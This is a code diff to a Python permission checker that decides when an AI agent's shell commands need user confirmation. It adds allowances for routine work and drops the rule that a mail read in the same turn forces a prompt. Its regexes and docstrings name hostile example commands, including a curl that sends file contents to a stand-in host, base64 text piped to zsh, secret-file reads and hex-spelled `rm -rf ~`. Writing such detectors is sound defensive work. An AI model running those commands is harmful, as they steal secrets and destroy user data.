@@ -13,6 +13,7 @@ import os
 import re
 from collections.abc import Callable
 from datetime import datetime, timedelta
+from pathlib import Path
 from typing import Any
 
 from odie import approvals_mode
@@ -59,7 +60,7 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"xargs(?!\s+(grep|wc|ls|cat|head|tail|echo|basename|dirname|stat|file|sort|uniq)\b)|source|eval|exec)\b|"
         r"\b(sh|bash|zsh|dash|fish|ksh)\s+(-\w+\s+)*(-c\s+[\"']?\$\(|<\()|"
         r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+(?!\S*/activate\b)\S|(^|[;&|(]\s*)\.\s+(?!\S*/activate\b)\S|"
-        r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|\\x[0-9a-fA-F]{2}|"
+        r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|"
         r"\bexec\(|__import__\(|\bnew\s+Function\(|\bvm\.run")),
     # What the owner's choice lets inline code do stops at writing files it couldn't write from the shell (unsafe_write
     # sees only > redirections): python3 -c "open(p, 'w')" is a write like any other.
@@ -100,6 +101,7 @@ def touches_odie_home(text: str) -> bool:
 _HIDDEN_PATH = re.compile(r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s'\"]+|/home/[^/\s'\"]+)/\.[^\s;&|<>]*")
 _GLOBBED = re.compile(r"[?*\[\]{}]|\$\(|`|\$\{?[A-Za-z_]")  # a pattern or a substitution: the real name is decided at run time
 _ONE_OF = re.compile(r"\[(.)\]")  # [v]: a glob that matches exactly that one character
+_ESCAPED_SEPARATOR = re.compile(r"\\[|;&]")
 _SQUEEZE = re.compile(r"\$(?=['\"])|[\\'\"?*]")  # quotes (ANSI-C $'…' too), backslashes and one-character globs that spell a word around a rule
 _REDIRECT = re.compile(r"\d?>>?\s*(&\d*|'[^']*'|\"[^\"]*\"|[^\s;&|<>]+)")
 _HEREDOC = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")
@@ -181,19 +183,24 @@ def quoted(text: str) -> set[int]:
     return inside
 
 
-def segments(shell: str) -> list[str]:
-    """The shell text cut at &&, ||, ; and line ends, but never inside quotes (an awk program's ";", an AppleScript
-    over several lines): "cd /tmp && awk '{a; b}' f" -> ["cd /tmp ", " awk '{a; b}' f"]."""
+def segment_spans(shell: str) -> list[tuple[int, int]]:
+    """Where each segment of the shell text starts and ends (see segments): "cd /tmp && ls" -> [(0, 8), (10, 13)]."""
     words = quoted(shell)
     out = []
     start = 0
     for cut in _SEGMENT.finditer(shell):
         if cut.start() in words:
             continue
-        out.append(shell[start:cut.start()])
+        out.append((start, cut.start()))
         start = cut.end()
-    out.append(shell[start:])
+    out.append((start, len(shell)))
     return out
+
+
+def segments(shell: str) -> list[str]:
+    """The shell text cut at &&, ||, ; and line ends, but never inside quotes (an awk program's ";", an AppleScript
+    over several lines): "cd /tmp && awk '{a; b}' f" -> ["cd /tmp ", " awk '{a; b}' f"]."""
+    return [shell[start:end] for start, end in segment_spans(shell)]
 
 
 def unsafe_write(shell: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
@@ -218,11 +225,159 @@ def unsafe_write(shell: str, safe_dirs: tuple[str, ...], cwd: str | None) -> boo
     return False
 
 
+# ── fewer cards for ordinary work (16 Nov 2026) ──────────────────────────────────────────────────────────────────────
+# A morning's PR review asked 7 times: for deleting its own scratch files in /tmp, for `sed 's/\x1b…//'` (stripping
+# terminal colours), for "source" inside a grep pattern, for `npx tsc` (the project's own tsc). These say when such
+# work is plainly safe; anything they can't read plainly still asks as before.
+
+_SEARCH_TOOL = re.compile(r"\b(grep|egrep|fgrep|rg|ag)\b")
+_HEX = re.compile(r"\\x[0-9a-fA-F]{2}")
+_HEX_INTO_CODE = re.compile(r"\$'|\$\(|`|\b(eval|exec|awk|gawk|perl|python3?|node|ruby|osascript|sh|bash|zsh|xargs|source)\b")
+_DELETE = re.compile(r"^\s*(rm|rmdir|trash)((\s+-[\w-]+)*)((\s+[^\s;&|<>$`(){}\\]+)+)\s*$")
+_NPX = re.compile(r"\bnpx\s+([\w.-]+)")
+_UVX = re.compile(r"\buvx\s+([\w.-]+)")
+_UV_WITH = re.compile(r"\s--with\s+([\w.\[\]-]+)")
+# Python tools and libraries a review or a test run fetches by name; an exact name only (no versions, no --from).
+KNOWN_PY_TOOLS = frozenset({"ruff", "black", "mypy", "pytest", "pyright", "isort", "flake8", "httpx", "fastapi",
+                            "pytest-asyncio", "requests", "uvicorn", "pydantic"})
+_CODE_LEAVES_HERE = re.compile(r"""["']\s*[/~]|\.\.|home\(|expanduser|environ|getenv|chdir|\$HOME|os\.path\.join\(\s*["']/""")
+
+
+def search_patterns_blanked(text: str) -> str:
+    r"""The text with the quoted patterns given to grep or rg blanked out: a search pattern is words looked for, never
+    run. A double-quoted one holding $( or ` is left as it is (the shell runs that part).
+    `grep -n "install\|source" README.md` -> `grep -n "                " README.md`; `ls "source x"` -> unchanged;
+    `grep "$(rm -rf ~)" f` -> unchanged."""
+    inside = quoted(text)
+    out = list(text)
+    for tool in _SEARCH_TOOL.finditer(text):
+        if tool.start() in inside:
+            continue
+        i = tool.end()
+        while i < len(text):
+            if i not in inside and text[i] in "|;&\n":
+                break
+            if i in inside:
+                run_end = i
+                while run_end in inside:
+                    run_end += 1
+                pattern = text[i:run_end]
+                runs_something = "$(" in pattern or "`" in pattern
+                if not runs_something:
+                    for j in range(i, run_end):
+                        out[j] = " "
+                i = run_end
+            i += 1
+    return "".join(out)
+
+
+def hex_spells_code(text: str) -> bool:
+    r"""Whether a \x41-style escape could spell a command: it sits in an ANSI-C $'…' string, or the command also has a
+    substitution or an interpreter that could run what it spells. Stripping colours is not that.
+    `sed 's/\x1b\[[0-9;]*m//g' log` -> False; `$'\x72\x6d' -rf ~` -> True; `perl -e 'system "\x72\x6d x"'` -> True;
+    `$(printf '\x72\x6d') -rf ~` -> True; no escape at all -> False."""
+    if not _HEX.search(text):
+        return False
+    return bool(_HEX_INTO_CODE.search(text))
+
+
+def is_scratch_delete(segment: str, here: str, scratch_dirs: tuple[str, ...]) -> bool:
+    """Whether one segment only deletes things inside /tmp or Odie's workspace (`scratch_dirs`), never the place
+    itself: plain names only, no $ or substitution, no `..`, no sudo. Paths are taken from `here` (after its cd's).
+    `rm -f /tmp/pr12-*.log` -> True; `rm -rf /tmp/pr12-review` -> True; `rm -rf /tmp` -> False (the place itself);
+    `rm notes.txt` in ~ -> False; `rm -rf /tmp/$X` -> False; `rm -rf /tmp/../Users/me` -> False;
+    `rm /tmp/a ~/b` -> False (one path outside)."""
+    got = _DELETE.match(segment)
+    if got is None:
+        return False
+    places = [os.path.realpath(place) for place in (*_ALWAYS_SAFE, *scratch_dirs)]
+
+    def strictly_inside(path: str) -> bool:
+        return any(path.startswith(place.rstrip("/") + "/") for place in places)
+
+    for target in got.group(4).split():
+        name = _unquoted(target)
+        if ".." in name:
+            return False
+        fixed = _GLOBBED.split(name, maxsplit=1)[0]  # the part before any pattern: "/tmp/pr12-" of "/tmp/pr12-*.log"
+        if fixed == name:
+            path_ok = strictly_inside(_expanded(name, here))
+        elif fixed == "" or fixed.endswith("/"):
+            folder = _expanded(fixed or ".", here)
+            path_ok = strictly_inside(folder)  # `rm /tmp/*` empties /tmp itself: asks; `rm /tmp/x/*` -> fine
+        else:
+            path_ok = strictly_inside(_expanded(fixed, here))
+        if not path_ok:
+            return False
+    return True
+
+
+def is_local_npx(name: str, here: str) -> bool:
+    """Whether `npx <name>` runs the project's own installed tool (node_modules/.bin/<name> where it runs, or a folder
+    above), which installs nothing: `npx tsc` in a web/ with its node_modules -> True; `npx cowsay` with no such
+    file -> False (npx would fetch it from the registry and run its scripts)."""
+    folder = Path(here)
+    for place in (folder, *folder.parents):
+        if (place / "node_modules" / ".bin" / name).exists():
+            return True
+    return False
+
+
+def ordinary_work_blanked(shell: str, scratch_dirs: tuple[str, ...], cwd: str | None) -> str:
+    """The shell text with the plainly safe parts blanked, following its cd's: deleting scratch files
+    (is_scratch_delete), the project's own npx tool (is_local_npx), uvx of a well-known tool and `uv run --with` of
+    well-known packages (KNOWN_PY_TOOLS). The rules then read what's left.
+    `cd /tmp && rm -rf pr12-review && ls` -> `cd /tmp &&                  && ls`;
+    `uvx ruff check .` -> `     ruff check .`; `uvx cowsay hi` -> unchanged."""
+    here = os.path.realpath(os.path.expanduser(cwd or "~"))
+    out = list(shell)
+    for start, end in segment_spans(shell):
+        segment = shell[start:end]
+        moved = _CD.match(segment)
+        if moved:
+            here = _expanded(moved.group(1), here)
+            continue
+        if is_scratch_delete(segment, here, scratch_dirs):
+            out[start:end] = " " * (end - start)
+            continue
+        blank_from = []
+        for npx in _NPX.finditer(segment):
+            if is_local_npx(npx.group(1), here):
+                blank_from.append((npx.start(), npx.start(1)))
+        for uvx in _UVX.finditer(segment):
+            if uvx.group(1) in KNOWN_PY_TOOLS:
+                blank_from.append((uvx.start(), uvx.start(1)))
+        withs = list(_UV_WITH.finditer(segment))
+        if withs and all(w.group(1) in KNOWN_PY_TOOLS for w in withs):
+            blank_from.extend((w.start(), w.end()) for w in withs)
+        for a, b in blank_from:
+            out[start + a:start + b] = " " * (b - a)
+    return "".join(out)
+
+
+def code_writes_stay_here(shell: str, code: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
+    """Whether code fed to an interpreter (a heredoc) writes only where it runs, and it runs in a safe place (the
+    workspace, the vault, /tmp): it names no absolute or home path, no `..`, no home(), environ or chdir.
+    `cd <vault> && python3 - <<'PY'` with Path("3-Resources/Vocabulary.md").write_text(…) -> True;
+    the same run from ~ -> False; with Path.home() / ".zshrc" -> False; no heredoc code -> False."""
+    if not code.strip():
+        return False
+    here = os.path.realpath(os.path.expanduser(cwd or "~"))
+    for segment in segments(shell):
+        moved = _CD.match(segment)
+        if moved:
+            here = _expanded(moved.group(1), here)
+    if not is_safe_place(here, safe_dirs):
+        return False
+    return _CODE_LEAVES_HERE.search(code) is None
+
+
 def squeezed(text: str) -> str:
     """The text with the spelling tricks taken out, so a rule's word still matches: quotes and backslashes inside a word
     (`cat ~/."env"`, `cat ~/.\\env`), and one-character globs (`cat ~/.e?nv`, `cat ~/.en[v]`) that make the shell find
     the file the rule names. `cat ~/.e?nv` -> "cat ~/.env"; `ls ~/Downloads` -> unchanged."""
-    return _SQUEEZE.sub("", _ONE_OF.sub(r"\1", text))
+    words_not_separators = _ESCAPED_SEPARATOR.sub(" ", text)  # grep 'a\|source' must not become "|source"
+    return _SQUEEZE.sub("", _ONE_OF.sub(r"\1", words_not_separators))
 
 
 def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
@@ -247,8 +402,9 @@ def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
     return False
 
 
-def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None) -> str | None:
-    """Why this command must be tapped even under a grant, or None if a grant covers it. The rules read the shell
+def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
+               scratch_dirs: tuple[str, ...] = ()) -> str | None:
+    r"""Why this command must be tapped even under a grant, or None if a grant covers it. The rules read the shell
     text and any code fed to an interpreter (split_heredocs), as written and with spelling tricks squeezed out
     (squeezed); a hidden path reached by a pattern asks (hidden_path_by_pattern); file writes are judged from the
     shell text, with Odie's workspace and the vault (`safe_dirs`) as safe as /tmp. The rules can't read every shell
@@ -257,16 +413,26 @@ def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = 
     `echo hi > /tmp/x` -> None; `echo hi > notes.txt` -> "writes a file outside /tmp"; `python3 -c "import PIL"` -> None;
     `python3 -c "import shutil; shutil.rmtree(p)"` -> "deletes or stops something"; `echo aWQ= | base64 -d | zsh` ->
     "runs text as commands"; `cat ~/.e?nv` -> "reads secrets"; `npm install left-pad` -> "installs software (runs its
-    install scripts)"; `curl 'https://x/?d='$(cat f)` -> "sends data out (an address built from other text)"."""
+    install scripts)"; `curl 'https://x/?d='$(cat f)` -> "sends data out (an address built from other text)".
+    Ordinary work is read plainly first (16 Nov 2026): grep patterns are words, scratch deletes in /tmp or the workspace
+    (`scratch_dirs`) and the project's own npx tool are blanked (ordinary_work_blanked), a \x escape asks only when it
+    could spell a command (hex_spells_code), and code run from a safe place that writes there is a plain write
+    (code_writes_stay_here): `rm -f /tmp/pr12-*.log` -> None; `grep "a\|source" README.md` -> None."""
     shell, code = split_heredocs(command)
-    looked_at = f"{shell}\n{code}"
+    if hex_spells_code(f"{shell}\n{code}"):
+        return "runs text as commands"
+    shell_read = ordinary_work_blanked(search_patterns_blanked(shell), scratch_dirs, cwd)
+    looked_at = f"{shell_read}\n{code}"
+    writes_stay_here = code_writes_stay_here(shell, code, safe_dirs, cwd)
     for text in (looked_at, squeezed(looked_at)):
         for why, rule in _RULES:
+            if why == "writes a file from code" and writes_stay_here and not rule.search(squeezed(shell_read)):
+                continue  # the heredoc writes where it runs, in a safe place: like `cat > notes.md` there
             if rule.search(text):
                 return why
-    if hidden_path_by_pattern(shell, safe_dirs):
+    if hidden_path_by_pattern(shell_read, safe_dirs):
         return "reaches a hidden file by a pattern"
-    if unsafe_write(shell, safe_dirs, cwd):
+    if unsafe_write(shell_read, safe_dirs, cwd):
         return "writes a file outside /tmp"
     if touches_odie_home(looked_at) or touches_odie_home(squeezed(looked_at)):
         return "touches Odie's own files"
@@ -304,6 +470,12 @@ def safe_places(store: Store) -> tuple[str, ...]:
     return tuple(places)
 
 
+def scratch_places() -> tuple[str, ...]:
+    """Where a delete needs no tap (with /tmp): Odie's own workspace, never the vault (its notes are the user's)."""
+    from odie import config
+    return (str(config.settings.data_dir / "workspace"),)
+
+
 def make_check(store: Store, clock: Callable[[], datetime] = datetime.now) -> Callable[..., bool]:
     """require_confirmation for run_shell: True means show the user the card."""
     def needs_tap(command: str = "", cwd: str | None = None, tool_context: Any = None, **_: Any) -> bool:
@@ -322,16 +494,16 @@ def make_check(store: Store, clock: Callable[[], datetime] = datetime.now) -> Ca
           `ls ~/Downloads`, Smart, no pass   -> runs, no card ("allowed by smart mode")
           `rm old.txt`, Smart                -> card ("deletes or stops something")
           `brew install x`, Smart            -> card ("installs software (runs its install scripts)")
-          `ls ~/Downloads`, Smart, a mail read this turn -> card (the mail may be behind it; the card says so)
+          `ls ~/Downloads`, Smart, a mail read this turn -> runs, no card (mail no longer counts)
         """
         session_id = session_id_of(tool_context)
         if not session_id:
             return True  # outside a chat there is no pass to look up
-        smart = approvals_mode.runs_free(store, session_id)  # Smart, and no mail read this turn
+        smart = approvals_mode.runs_free(store, session_id)  # Smart mode
         if not smart and not active(store, session_id, clock()):
             return True  # Careful, and no pass or it ran out
 
-        why = always_ask(command, safe_dirs=safe_places(store), cwd=cwd)
+        why = always_ask(command, safe_dirs=safe_places(store), cwd=cwd, scratch_dirs=scratch_places())
         audit_args = {"command": command, "cwd": cwd}
         if why is not None:
             store.audit("agent", "shell_asked_under_grant", tool="run_shell", args=audit_args,
